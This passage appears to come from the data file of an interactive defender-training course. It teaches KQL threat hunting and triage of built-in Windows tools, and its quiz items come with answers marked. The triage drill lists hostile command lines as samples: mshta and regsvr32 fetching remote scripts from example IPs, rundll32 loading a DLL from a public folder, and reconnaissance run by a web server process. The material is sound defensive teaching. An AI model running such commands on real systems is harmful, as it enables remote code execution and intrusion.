              { id: "c", text: "| join kind=inner DeviceFileEvents on $left.ProcessId == $right.InitiatingProcessId", why: "Two files came back, one from another laptop. Process IDs repeat across devices, so a PID alone isn't a key.", apply: { op: "join", table: "DeviceFileEvents", left: "ProcessId", right: "InitiatingProcessId" } },
              { id: "d", text: "| join kind=inner DeviceFileEvents on DeviceName, $left.ProcessId == $right.InitiatingProcessId", right: true, why: "A file event records which process caused it, so the device plus the process ID ties the two tables together. Pick the table that holds the other half of the question, then join on what identifies one process.", apply: { op: "join", table: "DeviceFileEvents", left: "ProcessId", right: "InitiatingProcessId", also: "DeviceName" } },
            ],
          },
          {
            id: "show", ask: "Line 6: show only what the ticket needs. Both tables had a FileName column, so the right-hand one is now FileName1.",
            choices: [
              { id: "a", text: "| project DeviceName, AccountName, FileName, FolderPath", why: "FileName is the left table's: certutil.exe. The downloaded file is FileName1.", apply: { op: "project", cols: ["DeviceName", "AccountName", "FileName", "FolderPath"] } },
              { id: "b", text: "| project DeviceName, AccountName, ProcessCommandLine, FileName1, FolderPath", right: true, why: "One row: device, user, the command, the file, and where it landed.", apply: { op: "project", cols: ["DeviceName", "AccountName", "ProcessCommandLine", "FileName1", "FolderPath"] } },
              { id: "c", text: "| summarize count() by AccountName", why: "A count tells you how often. The ticket needs what and where.", apply: { op: "summarize", by: ["AccountName"] } },
            ],
          },
        ],
        expect: 1,
        lesson: "Filter on what ran, narrow by how it ran, judge by who started it, then join to the table that answers the next question. Keep Timestamp limits in real queries, and use Timestamp in Advanced Hunting or TimeGenerated in Sentinel. Once a hunt proves itself, Create detection rule turns it into something that runs on a schedule.",
      },
      {
        kind: "intercept",
        title: "Triage the Hits",
        prompt: "A hunt for built-in tools started by something unexpected came back with these rows. You can't chase them all. The parent and how widely it runs tell you which are worth a morning: escalate the odd ones and baseline the rest.",
        protect: "your morning",
        blockLabel: "Escalate",
        passLabel: "Baseline",
        seconds: 12,
        items: [
          { id: "i1", text: "mshta.exe http://198.51.100.61/p.hta", sub: "Parent OUTLOOK.EXE, one Legal laptop", bad: true, why: "A mail client starting a script host that fetches from the internet is never maintenance." },
          { id: "i2", text: "wmic.exe product get name", sub: "Parent IntuneManagementExtension.exe, 170 devices, every week", bad: false, why: "The management agent, everywhere, on a schedule. Check it once, then baseline it." },
          { id: "i3", text: "regsvr32.exe /s /n /u /i:http://203.0.113.40/x.sct scrobj.dll", sub: "Parent EXCEL.EXE, one Finance laptop", bad: true, why: "An Office parent, a remote script, one host." },
          { id: "i4", text: "bitsadmin /transfer fonts", sub: "Parent the signed font updater, 60 devices at 03:00", bad: false, why: "Same tool, same time, a known updater, and it fits the estate." },
          { id: "i5", text: "rundll32.exe C:\\Users\\Public\\u.dll,Start", sub: "Parent WINWORD.EXE, one Editorial laptop", bad: true, why: "A DLL from a public folder started by Word." },
          { id: "i6", text: "certutil.exe -hashfile setup.msi SHA256", sub: "Parent cmd.exe, a packaging engineer", bad: false, why: "Hashing is what the tool is for, and it's that person's job." },
          { id: "i7", text: "powershell.exe -File inventory.ps1", sub: "Parent the signed asset agent, 180 devices, daily", bad: false, why: "Widespread, scheduled, signed parent." },
          { id: "i8", text: "cmd.exe /c whoami & net group", sub: "Parent w3wp.exe, the rights portal server", bad: true, why: "A web server process asking who it is: that's someone inside the app." },
          { id: "i9", text: "msiexec.exe /i printer_driver.msi", sub: "Parent the software centre, 22 devices after a change ticket", bad: false, why: "A ticket and a known deployment path." },
        ],
        lesson: "A built-in tool proves nothing either way. The parent process and how far it spreads do most of the work: wide, scheduled and signed gets checked once and baselined. Rare, on one host, and started by an application that has no business doing it is where the morning goes.",
      },
    ],
  },
};
